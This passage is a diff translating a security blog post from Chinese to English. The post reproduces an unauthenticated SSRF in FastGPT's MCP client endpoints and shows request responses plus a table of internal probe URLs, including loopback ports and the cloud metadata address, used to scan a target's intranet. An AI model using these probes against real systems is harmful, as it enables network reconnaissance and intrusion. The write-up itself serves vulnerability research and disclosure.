class="hljs-punctuation">,</span><span class="hljs-attr">&quot;headerSecret&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;params&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure>
 
-<p>响应（与 getTools 完全一致的回显 oracle）：</p>
+<p>Response (an echo oracle identical to getTools):</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;code&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">500</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;SSE error: TypeError: fetch failed: connect ECONNREFUSED 127.0.0.1:47654&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p>runTool 相对 getTools 的增量：<code>toolName</code> 与 <code>params</code> 完全可控 —— 当 <code>url</code> 指向内网真实 MCP 服务时可发起协议级工具调用；指向攻击者服务器时可在 body 中携带任意 arguments（同系列目标已用 webhook.site 实证：两接口均产生 GET+POST 成对回连，UA&#x3D;node，来源 IP 为目标服务器本身）。</p>
-<p><strong>判定逻辑</strong>：可达目标返回”内容类型&#x2F;证书校验”错误、关闭端口返回”ECONNREFUSED + IP:端口”，两类响应可区分且均由服务器侧产生 → 两接口 SSRF 均成立</p>
-<h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><p><img src="/../img/fastgpt-mcpClient/image-20260904005010864.png" srcset="/img/loading.gif" lazyload alt="image-20260904005010864"></p>
+<p>runTool’s increment over getTools: <code>toolName</code> and <code>params</code> are fully controllable — when <code>url</code> points to a real intranet MCP service, protocol-level tool calls can be initiated; when it points to an attacker-controlled server, arbitrary arguments can be carried in the body (verified empirically against targets of the same series via webhook.site: both endpoints produced paired GET+POST callbacks, UA&#x3D;node, with the source IP being the target server itself).</p>
+<p><strong>Determination logic</strong>: reachable targets return “content type&#x2F;certificate validation” errors, closed ports return “ECONNREFUSED + IP:port”; the two response classes are distinguishable and both are produced server-side → the SSRF holds on both endpoints.</p>
+<h2 id="Real-World-Case"><a href="#Real-World-Case" class="headerlink" title="Real-World Case"></a>Real-World Case</h2><p><img src="/../img/fastgpt-mcpClient/image-20260904005010864.png" srcset="/img/loading.gif" lazyload alt="image-20260904005010864"></p>
 <p><img src="/../img/fastgpt-mcpClient/image-20260904005031898.png" srcset="/img/loading.gif" lazyload alt="image-20260904005031898"></p>
-<p>实际测试下来发现</p>
-<p>用 mcp&#x2F;client getTools 对目标内网地址段做系统化探测，每种网络状态都有<strong>可区分的回显</strong>：</p>
+<p>What actual testing revealed:</p>
+<p>Using mcp&#x2F;client getTools to systematically probe the target’s intranet address range, every network state yields a <strong>distinguishable echo</strong>:</p>
 <table>
 <thead>
 <tr>
-<th>探测地址</th>
-<th>回显</th>
-<th>状态判定</th>
+<th>Probe address</th>
+<th>Echo</th>
+<th>Status determination</th>
 </tr>
 </thead>
 <tbody><tr>
 <td><code>http://127.0.0.1:3000</code></td>
 <td><code>connect ECONNREFUSED 127.0.0.1:3000</code></td>
-<td>闭合（<strong>精确回显 IP:端口</strong>）</td>
+<td>Closed (<strong>precise IP:port echo</strong>)</td>
 </tr>
 <tr>
 <td><code>http://127.0.0.1:3001/3002/27017/6379/80/443/47654</code></td>
-<td>全部 <code>ECONNREFUSED 127.0.0.1:&lt;端口&gt;</code></td>
-<td>逐端口闭合确认</td>
+<td>All <code>ECONNREFUSED 127.0.0.1:&lt;port&gt;</code></td>
+<td>Port-by-port closed confirmation</td>
 </tr>
 <tr>
 <td><code>http://172.18.0.1:3000</code></td>
 <td><code>Invalid content type</code></td>
-<td><strong>开放</strong>（HTTP 服务，非 MCP）</td>
+<td><strong>Open</strong> (HTTP service, not MCP)</td>
 </tr>
 <tr>
 <td><code>http://172.18.0.1:3000/definitely-not-exist-xyz</code></td>
 <td><code>Non-200 status code (404)</code></td>
-<td><strong>开放且服务指纹可读</strong>（404 应答）</td>
+<td><strong>Open with readable service fingerprint</strong> (404)</td>
 </tr>
 <tr>
 <td><code>http://172.18.0.1:3001</code></td>
 <td><code>connect ECONNREFUSED 172.18.0.1:3001</code></td>
-<td>同主机闭合端口</td>
+<td>Closed port on the same host</td>
 </tr>
 <tr>
 <td><code>http://172.18.0.1:27017</code></td>
 <td><code>connect ECONNREFUSED 172.18.0.1:27017</code></td>
-<td>同主机闭合端口</td>
+<td>Closed port on the same host</td>
 </tr>
 <tr>
 <td><code>http://172.17.0.1:80/3000/3001/3005/3306</code></td>
-<td>无回显（超时）</td>
-<td><strong>被过滤</strong>（与闭合状态明确区分）</td>
+<td>No echo (timeout)</td>
+<td><strong>Filtered</strong> (clearly distinct from closed)</td>
 </tr>
 <tr>
 <td><code>http://10.0.0.1:80</code></td>
-<td>无回显（超时）</td>
-<td>被过滤&#x2F;不可达</td>
+<td>No echo (timeout)</td>
+<td>Filtered &#x2F; unreachable</td>
 </tr>
 <tr>
 <td><code>http://169.254.169.254/latest/meta-data/</code></td>
-<td>无回显（超时）</td>
-<td>云元数据被防火墙过滤</td>
+<td>No echo (timeout)</td>
+<td>Cloud metadata blocked by firewall</td>
 </tr>
 </tbody></table>
-<p><strong>结论</strong>：三种网络状态（开放&#x2F;闭合&#x2F;被过滤）通过不同回显完全可区分，且在同一内网主机（172.18.0.1）上实现了逐端口判别 —— 该 SSRF 是一个<strong>完整的内网端口扫描与服务指纹识别 oracle</strong>，实测即发现了内网开放服务 172.18.0.1:3000</p>
+<p><strong>Conclusion</strong>: the three network states (open&#x2F;closed&#x2F;filtered) are fully distinguishable through different echoes, and port-by-port discrimination was achieved against the same intranet host (172.18.0.1) — this SSRF is a <strong>complete intranet port-scanning and service-fingerprinting oracle</strong>; in actual testing it immediately revealed the open intranet service 172.18.0.1:3000.</p>
 
                 
               </div>
@@ -647,12 +629,12 @@
     
       <span class="category-chain">
         
-  <a href="/categories/web%E5%AE%89%E5%85%A8/" class="category-chain-item">web安全</a>
+  <a href="/categories/web-security/" class="category-chain-item">web security</a>
   
   
     <span>></span>
     
-  <a href="/categories/web%E5%AE%89%E5%85%A8/cve/" class="category-chain-item">cve</a>
+  <a href="/categories/web-security/CVE/" class="category-chain-item">CVE</a>
   
   
 
@@ -671,13 +653,13 @@
       
         <a href="/tags/CTF/" class="print-no-link">#CTF</a>
       
-        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="print-no-link">#网络安全</a>
+        <a href="/tags/cybersecurity/" class="print-no-link">#cybersecurity</a>
       
-        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="print-no-link">#渗透测试</a>
+        <a href="/tags/penetration-testing/" class="print-no-link">#penetration testing</a>
       
-        <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="print-no-link">#漏洞挖掘</a>
+        <a href="/tags/vulnerability-hunting/" class="print-no-link">#vulnerability hunting</a>
       
-        <a href="/tags/cve/" class="print-no-link">#cve</a>
+        <a href="/tags/CVE/" class="print-no-link">#CVE</a>
       
     </div>
   
@@ -689,8 +671,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>fastgpt-mcpCLient未认证ssrf复现</div>
-      <div>https://exploreio.github.io/2026/09/04/fastgpt-mcpCLient未认证ssrf复现/</div>
+      <div>FastGPT MCP Client Unauthenticated SSRF Reproduction</div>
+      <div>https://exploreio.github.io/2026/09/04/fastgpt-mcpClient-unauthenticated-ssrf/</div>
     </div>
     <div class="license-meta">
       
@@ -734,12 +716,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2026/09/04/fastgpt-mcpCLient%E6%9C%AA%E8%AE%A4%E8%AF%81ssrf%E5%A4%8D%E7%8E%B0/" title="fastgpt-mcpCLient未认证ssrf复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">fastgpt-mcpCLient未认证ssrf复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/09/04/fastgpt-mcpClient-unauthenticated-ssrf/" title="FastGPT MCP Client Unauthenticated SSRF Reproduction">
-                        <span class="hidden-mobile">FastGPT MCP Client Unauthenticated SSRF Reproduction</span>
+                      <a href="/2026/08/29/CVE-2026-79483-EN/" title="CVE-2026-79483-EN">
+                        <span class="hidden-mobile">CVE-2026-79483-EN</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
